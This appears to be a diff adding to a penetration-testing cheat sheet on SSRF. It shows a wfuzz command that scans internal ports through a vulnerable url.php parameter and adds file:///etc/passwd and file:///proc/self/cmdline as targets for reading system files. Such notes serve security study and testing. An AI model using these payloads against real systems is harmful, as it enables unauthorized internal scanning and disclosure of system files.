@@ -29,3 +29,9 @@
 #### wfuzz -c -z range,1-65535 http://TARGET_IP/url.php?path=127.0.0.1:FUZZ
 
 ### TIP: If you find yourself some files with SSRF, don't forget to check their contents by viewing the page source!
+
+## Important Files to check out with SSRF:
+
+ - file:///etc/passwd
+
+ - file:///proc/self/cmdline
